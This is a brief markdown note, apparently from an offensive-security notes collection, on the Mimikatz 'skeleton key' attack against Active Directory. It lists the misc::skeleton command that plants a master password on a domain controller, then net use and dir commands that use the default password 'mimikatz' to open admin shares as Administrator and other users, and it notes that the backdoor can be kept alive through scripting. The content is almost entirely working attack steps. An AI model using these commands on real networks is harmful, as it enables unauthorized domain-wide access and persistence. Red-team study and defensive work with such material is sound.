# Skeleton Key

[Mimikatz](../../Attacking%20Kerberos/Mimikatz.md)

Installing the skeleton key

```sh
misc::skeleton
```

## Accessing the Forest

The default credentials will be: "`mimikatz`"

```sh
net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
```

The share will now be accessible without needing the Administrator password

```sh
dir \\Desktop-1\c$ /user:Machine1 mimikatz
```

Access the Desktop-1 directory without ever knowing which users have access to DESKTOP-1

> The skeleton key will not persist by itself as it runs in memory, but it can be scripted or maintained using other tools and techniques.
